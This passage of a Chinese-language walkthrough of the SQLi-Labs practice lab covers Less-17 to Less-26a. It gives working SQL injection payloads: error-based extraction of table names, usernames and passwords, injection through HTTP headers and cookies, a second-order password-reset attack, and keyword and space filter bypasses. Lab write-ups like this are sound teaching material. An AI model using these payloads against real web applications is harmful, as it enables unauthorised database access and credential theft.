alt="image-20240723100409065"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723100458896.png" alt="image-20240723100458896"></p><p>这里的注入方式与Less-5用的相同，报错注入可以选择extractvalue()报错注入，updatexml()报错注入和group by()报错注入。<br>之前的题目没有介绍报错注入，下面简单说一下者三种报错注入的原理。</p><p>需要注意：下面的注入代码要写在password输入框内，且用户名需要填写数据库内原有的用户（如admin等）</p><p><strong>extractvalue报错注入</strong></p><p>extractvalue(XML_document,XPath_string)</p><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p><p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p><p>作用：从XML_document中提取符合XPATH_string的值，当我们XPath_string语法报错时候就会报错，下面的语法就是错误的。concat和我前面说的的group_concat作用一样<br><strong>下面是报错注入代码，在最后一步爆字段内容时候，会报错，原因是mysql数据不支持查询和更新是同一张表。所以我们需要加一个中间表。这个关卡需要输入正确账号因为是密码重置页面，所以爆出的是该账户的原始密码。如果查询时不是users表就不会报错。</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆版本</span><br><span class="line">1&#x27; and (extractvalue(1,concat(0x5c,version(),0x5c)))#</span><br><span class="line"></span><br><span class="line">爆数据库</span><br><span class="line">1&#x27; and (extractvalue(1,concat(0x5c,database(),0x5c)))#</span><br><span class="line"></span><br><span class="line">爆表名</span><br><span class="line">1&#x27; and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)))#</span><br><span class="line"></span><br><span class="line">爆字段名</span><br><span class="line">1&#x27; and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x5c)))# </span><br><span class="line"></span><br><span class="line">爆字段内容该格式针对mysql数据库</span><br><span class="line">1&#x27; and (extractvalue(1,concat(0x5c,(select password from (select password from users where username=&#x27;admin1&#x27;) b) ,0x5c)))#</span><br><span class="line"></span><br><span class="line">爆字段内容</span><br><span class="line">1&#x27; and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))#</span><br></pre></td></tr></table></figure><p><strong>updatexml报错注入</strong></p><p>UPDATEXML (XML_document, XPath_string, new_value)</p><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p><p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p><p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p><p>作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值</p><p>当我们XPath_string语法报错时候就会报错，updatexml()报错注入和extractvalue()报错注入基本差不多。</p><p><strong>下面已将该报错注入代码给到大家，最后爆字段和上面一样如果加一个中间表。</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆版本</span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,version(),0x5c),1))#</span><br><span class="line"></span><br><span class="line">爆数据库</span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,database(),0x5c),1))#</span><br><span class="line"></span><br><span class="line">爆表名</span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#</span><br><span class="line"></span><br><span class="line">爆字段名</span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name =&#x27;users&#x27;),0x5c),1))#</span><br><span class="line"></span><br><span class="line">爆密码该格式针对mysql数据库。</span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select password from (select password from users where username=&#x27;admin1&#x27;) b),0x5c),1))#</span><br><span class="line"></span><br><span class="line">爆其他表就可以，下面是爆emails表</span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name =&#x27;emails&#x27;),0x5c),1))#</span><br><span class="line"></span><br><span class="line">爆字段内容</span><br><span class="line">1&#x27; and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#</span><br></pre></td></tr></table></figure><p><strong>group by报错注入</strong></p><p>group by 报错可以看这个文章，此文章博主写的很清楚。这个报错注入比前面两个复杂一点。</p><p>[mysql group by报错注入_sql注入group by-CSDN博客](<a href="https://blog.csdn.net/qq_51524329/article/details/126371091?ops_request_misc=%7B%22request_id%22:%22172170078316800222839442%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=172170078316800222839442&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-126371091-null-null.142%5Ev100%5Epc_search_result_base4&utm_term=%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3group">https://blog.csdn.net/qq_51524329/article/details/126371091?ops_request_misc=%7B%22request%5Fid%22%3A%22172170078316800222839442%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=172170078316800222839442&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-126371091-null-null.142^v100^pc_search_result_base4&amp;utm_term=深入理解group</a> by报错注入&amp;spm&#x3D;1018.2226.3001.4187)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库</span><br><span class="line">123&#x27; and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">爆数据库版本</span><br><span class="line">123&#x27; and (select count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#</span><br><span class="line"> </span><br><span class="line">通过修改limit后面数字一个一个爆表</span><br><span class="line">1&#x27; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">爆出所有表</span><br><span class="line">1&#x27; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))#</span><br><span class="line"> </span><br><span class="line">爆出所有字段名</span><br><span class="line">1&#x27; and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">爆出所有字段名</span><br><span class="line">1&#x27; and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">爆出该账户的密码</span><br><span class="line">1&#x27; and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username=&#x27;admin1&#x27;),0x7e,floor(rand(0)*2)))a)#</span><br></pre></td></tr></table></figure><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>此关在输入用户名和密码以后，发现屏幕上回显了我们的IP地址和我们的User Agent</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723103627892.png" alt="image-20240723103627892"></p><p>用hackbar抓取POST包，在用户名和密码的位置判断注入点，这里我试了很久，发现用户名和密码的位置都是没有注入点的，那是不是代表这关不存在SQL注入漏洞呢，我们注意到一个特点，页面回显了我们的User Agent，所以我们猜想可能注入点在User Agent这里</p><p>使用BurpSuite抓取数据包，看到数据包中出现了User Agent</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723104333888.png" alt="image-20240723104333888"></p><p>猜想可能注入点在User Agent这里，删掉User Agent的内容输入个’试试</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723104510899.png" alt="image-20240723104510899"></p><p>我们发现输入’时系统报错，证明有SQL注入漏洞，这里有完整的错误回显，根据错误回显我们判断闭合方式为’#，并且为字符型注入，所以我们利用报错注入攻击</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723104900563.png" alt="image-20240723104900563"></p><p>这里还有一个问题，进行注释的时候，–+，#，;%00都用不了，所有这里我们利用<code>or &#39;1&#39;=&#39;1</code>查表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(1,(select database())),1) or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723104840600.png" alt="image-20240723104840600"></p><p>依次猜解所有表，查到users表（注意：由于数据有多条，但是报错注入一次只能显示一条数据，所以在SQL语句末尾加上<code>limit</code>参数进行逐条显示）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1)),1) or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723105245428.png" alt="image-20240723105245428"></p><p>查字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(1,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)),1) or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723105347461.png" alt="image-20240723105347461"><br>查值（username)</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723105717887.png" alt="image-20240723105717887"></p><p>查值（password）</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723105736843.png" alt="image-20240723105736843"></p><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>当输入正确的账户密码时会显示自己的Referer，可以使用这个信息进行报错注入</p><p>使用BurpSuite抓包，发现数据包内有Referer信息，可以修改此信息进行注入</p><p>报错注入代码与Less-18一样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(1,(select database())),1) or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723110126451.png" alt="image-20240723110126451"></p><p>注入步骤与Less-18一样，这里不再赘述</p><h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>本关在输入正确的账户密码后会显示当前用户的cookie，可以通过修改cookie实现注入</p><p>使用BurpSuite抓包，发现数据包内有cookie信息，可以修改此信息进行报错注入</p><p>报错注入代码与Less-18和Less-19一样</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723110522358.png" alt="image-20240723110522358"></p><p>步骤与上两题一样，不再赘述</p><h2 id="第二部分：Advanced-Injections"><a href="#第二部分：Advanced-Injections" class="headerlink" title="第二部分：Advanced Injections"></a>第二部分：Advanced Injections</h2><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><p>本关看起来与上题一样，但是抓包后发现cookie是一串字符，一看就知道是base64</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723111059315.png" alt="image-20240723111059315"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723110932232.png" alt="image-20240723110932232"></p><p>可以将单引号进行编码发回给页面，可以发现报错并且还得有括号。</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723111409612.png" alt="image-20240723111409612"></p><p>将注入代码进行编码，可以看到爆出账户密码。注入代码与上题一样</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723111533837.png" alt="image-20240723111533837"></p><p>步骤一样，不再赘述</p><h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><p>此关和Less-21一样只不过cookie是双引号base64编码，没有括号。</p><h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><p>本关又回到了GET传参方式。</p><p>查看源代码后发现关键的sql语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br></pre></td></tr></table></figure><p>从该SQL语句中我们可以看出如果我们要构造payload那么我们需要做的就是闭合前面的单引号、同时闭合后面的单引号。</p><p>尝试报错注入，成功</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723112317507.png" alt="image-20240723112317507"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723112347690.png" alt="image-20240723112347690"></p><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>提示说：please login to continue,请登录以继续。<br>没有账号怎么登录？<br>当然是选择注册</p><p><strong>开始注入</strong></p><p>注册 admin’ # 账号，密码我们随便设置，这里设置12345</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20240723145806.png" alt="微信截图_20240723145806"></p><p>注意此时的数据库中出现了 admin’ # 的用户，还要注意此时原账户admin的密码为admin</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723150240208.png" alt="image-20240723150240208"></p><p><strong>登录账户 admin’ #,并修改密码为123</strong></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20240723145910.png" alt="微信截图_20240723145910"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20240723145919.png" alt="微信截图_20240723145919"></p><p>修改成功（此时真的是修改admin ‘#的密码吗）</p><p>查看修改后数据库，发现admin的密码成了123，而admin ‘#的密码并没有重置：</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723150308113.png" alt="image-20240723150308113"></p><p>使用更改的密码<code>123</code>登录admin账户，显示登录成功</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723150903970.png" alt="image-20240723150903970"></p><p>这就是二次注入，它的原理是：</p><p>（1）后端（PHP）代码对语句进行了转义</p><p>（2）保存进数据库（mysql）时没有转义，是原语句</p><p>简而言之就是数据库对自己存储的数据非常放心，而用户恰恰向数据库插入了恶意语句。</p><p><strong>解析</strong>：<br>比如前面所注册的admin ‘#账号，在注册时，后端对其进行了转义（ addslashes() 或者mysql_real_escape_string和mysql_escape_string 等），’#被转义成了其他的东西，所以一次注入无效。<br>但是在保存进数据库的时候，还是admin ‘#。</p><p>那么修改密码时的语句如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set  password=&#x27;123&#x27; where username=&#x27;admin &#x27;#&#x27;</span><br></pre></td></tr></table></figure><p>所以你以为修改的是<code>admin &#39;#</code>的账号，但是数据库理解成要修改密码的账号是<code>admin</code>。</p><p><strong>代码审计</strong></p><p>login.php</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723142639739.png" alt="image-20240723142639739"></p><p>login_create.php</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723142709236.png" alt="image-20240723142709236"></p><p>pass_change.php</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723142726706.png" alt="image-20240723142726706"></p><p>这几个文件出现频率最高的代码是<code>session_start()</code></p><p><strong>资料参考</strong>：</p><p>session_start() 会创建新会话或者重用现有会话。 如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID， 则会重用现有会话。<br>session_start的作用是开启<code>$_SESSION</code>,需要在<code>$_SESSION</code>使用之前调用。<br>PHP $_SESSION 变量用于存储关于用户会话（session）的信息</p><p>继续分析：</p><p><strong>login.php</strong></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723143253989.png" alt="image-20240723143253989"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP mysql_real_escape_string() 函数</span><br><span class="line"></span><br><span class="line">mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line">下列字符受影响：</span><br><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">\x1a</span><br><span class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</span><br><span class="line"></span><br><span class="line">语法</span><br><span class="line">mysql_real_escape_string(string,connection)</span><br><span class="line">参数描述</span><br><span class="line">string必需。规定要转义的字符串。</span><br><span class="line">connection可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</span><br><span class="line">说明</span><br><span class="line">本函数将 string 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于 mysql_query()。</span><br></pre></td></tr></table></figure><p>可以看到代码对username和passseord的特殊字符进行了转义，想要在这里进行注入就得采取“绕过”，但这不是我们这道题想要的解法，我们就当这里无法注入好了，也就是说在登录页面login.php处无法进行注入。</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723143444234.png" alt="image-20240723143444234"></p><p>登录成功后创建<code>session</code>和<code>cookie</code>，<code>session</code>存储<code>username</code>，但<code>session</code>是建立在服务器上的对象，所以无法获取；<code>cookie</code>只是个登录标记，几乎没有任何用处。（会话15分钟后过期）</p><p><strong>login_create.php</strong></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723143600083.png" alt="image-20240723143600083"></p><p>此SQL语句代码运行结果（以admin为例）</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723143818138.png" alt="image-20240723143818138"></p><p>创建用户前先查询是否已经存在该账户，若存在则弹出一个对话框，不存在就创建</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723144121776.png" alt="image-20240723144121776"></p><p>这里要注意：<code>mysql_escape_string()</code>和<code>mysql_real_escape_string()</code>是不同的，前者早在<code>PHP 5.3</code>中被弃用。</p><p>mysql_escape_string() 并不转义 % 和 _。 本函数和 mysql_real_escape_string() 完全一样，除了mysql_real_escape_string() 接受的是一个连接句柄并根据当前字符集转移字符串之外。mysql_escape_string()并不接受连接参数，也不管当前字符集设定<br>也就是说：mysql_escape_string()没办法判断当前的编码，mysql_real_escape_string()之所以能够防注入是因为同时指定了服务端的编码和客户端的编码。</p><p><strong>综上：</strong>username,password,re_password 这三个字段所传递的字符是要<strong>被转义</strong>的。</p><p><strong>pass_change.php</strong></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723144334731.png" alt="image-20240723144334731"></p><p><strong>重点来了：</strong><br>从session中直接获得了当前用户名，且被直接用于更新语句并未做检查。<br>从根本上来说，插入数据时没有过滤，只是做了转义处理。<br>若当前用户名中含有注释，便可以修改当前用户名中包含的另一用户的密码，例如注册用户：admin’– # 那么他就可以修改用户admin的密码。</p><p>此关卡中我们的步骤是注册一个 admin’ # 的账号，接下来登录该帐号后进行修改密码。此时修改的就是 admin 的密码</p><p>注入点在修改密码处</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; WHERE username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27;</span><br></pre></td></tr></table></figure><p>要将其变为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; WHERE username=&#x27;$username&#x27; # and password=&#x27;$curr_pass&#x27;</span><br></pre></td></tr></table></figure><p>也就是执行了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&#x27;新密码&#x27; WHERE username=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure><p><strong>防范</strong></p><p>至于如何防范二次注入也很简单：<br>一碗水端平，后端进行了转义，数据库也同样进行转义。</p><h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><p>本关根据提示是将or和and这两个替换成空，但是只替换一次。大小写绕过没有用。我们可以采用双写绕过。本次关卡使用联合注入就可以了，information里面涉及or可以写成infoorrmation。注入方式与前几题使用联合注入的步骤相同，不再赘述</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723151329418.png" alt="image-20240723151329418"></p><h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p>此题与上题类似，上题为字符型注入，此题为数字型注入，只需将id后面的单引号去掉即可</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723151639536.png" alt="image-20240723151639536"></p><h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><p>注入正常的参数，网页返回对应 id 的正常信息。当注入单引号进行闭合时，网页返回错误信息，从提示中可以看到注入的注释符被过滤了。</p><p>测试以下所有的参数，“OR”、“AND” 所有的注释符和空格全部都被过滤了。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> OR 1 = 1--+</span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; AND 1 = 1--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>/*</span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;/</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>\</span><br></pre></td></tr></table></figure><p>单引号没有被过滤，我们使用两个单引号分别闭合前后的引号。网页回显正常的内容，说明该网页存在单引号闭合的字符型注入。</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723155731680.png" alt="image-20240723155731680"></p><p>对于被过滤的字符，可以使用其他的字符进行替代，<strong>使用 “%a0” 或 “%0b” 替代空格，使用 “||” 替代 “or”，使用 “%26%26” 替代 “and”</strong>。例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; || 1 = 1  || &#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723160145224.png" alt="image-20240723160145224"></p><p>此时我们可以使用 updatexml() 报错注入，因为这种手法不需要考虑空格的问题。爆数据库名。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; || updatexml(1,concat(0x7e,database()),1) || &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723160209111.png" alt="image-20240723160209111"></p><p>爆表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; || updatexml(1, concat(0x7e, (SELECT (group_concat(table_name)) FROM (infoorrmation_schema.tables) WHERE (table_schema=&#x27;security&#x27;))) ,1) || &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723160350308.png" alt="image-20240723160350308"></p><p>爆字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;||updatexml(1,concat(1,(SELECT (group_concat(column_name)) FROM (infoorrmation_schema.columns) WHERE (table_schema=&#x27;security&#x27; %26%26 table_name = &#x27;users&#x27;))) ,1) || &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723160513002.png" alt="image-20240723160513002"></p><p>爆数据内容</p><p>这里我们无法直接从 users 表拿数据，我们可以先用一个表暂存从 users 表中取出所有数据的查询，然后再从这个暂存的表中取出数据。构造出的 payload 如下，思路就是利用一个查询从另一个查询中取出数据，以此绕过表的限制。注意到 “password” 要使用双写绕过，使用括号来代替空格的划分作用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; || updatexml(1,concat(0x0a,(SELECT(group_concat(concat_ws(0x3a,username,passwoorrd))) FROM (security.users) WHERE (id = 1) ))  ,1) || &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723160546585.png" alt="image-20240723160546585"></p><h3 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h3><p>注入正常的参数，网页返回对应 id 的正常信息，注入两个单引号分别闭合前后的引号。网页回显正常的内容，说明该网页存在单引号闭合的字符型注入。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723160724739.png" alt="image-20240723160724739"></p><p>想要进一步测试是否有括号时，网页没有回显信息，说明此时的错误信息不回显到网页上。此错误信息为环境问题，与题目无关</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723160845610.png" alt="image-20240723160845610"></p><p>尝试构造左右半边的空格来闭合，网页回显正常，说明参数有使用单层括号来闭合。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;) || (&#x27;1</span><br></pre></td></tr></table></figure><p><strong>获取数据库信息</strong></p><p>由于报错信息不回显，所以 updatexml() 报错注入不能使用。此处就需要使用 URL 编码来代替空格，然后用 UNION 注入。判断有几列可用，别忘了 “ORDER” 中的 “or” 被过滤掉了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)%a0OorRDER%a0BY%a03||(&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723161110914.png" alt="image-20240723161110914"></p><p>判断回显位置，此时注入的参数中的负号也被当做注释符，已经被过滤了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;)%a0UNION%a0SELECT%a01,2,3%a0||(&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723161227433.png" alt="image-20240723161227433"></p><p>爆数据库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;)%a0UNION%a0SELECT%a01,database(),3%a0||(&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723161313354.png" alt="image-20240723161313354"></p><p>爆表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;)%a0UNION%a0SELECT%a01,group_concat(table_name),3%a0FROM%a0infoORrmation_schema.tables%a0WHERE%a0table_schema = &#x27;security&#x27;%a0||(&#x27;1&#x27;)=(&#x27;2</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723161331465.png" alt="image-20240723161331465"></p><p>爆字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;)%a0UNION%a0SELECT%a01,group_concat(column_name),3%a0FROM%a0infoORrmation_schema.columns%a0WHERE%a0table_schema=&#x27;security&#x27;%a0AandND%a0table_name=&#x27;users&#x27;%a0||(&#x27;1&#x27;)=(&#x27;2</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723161442345.png" alt="image-20240723161442345"></p><p>爆数据内容</p><p>这里也是用其他符号代替空格即可，注意使用 WHERE 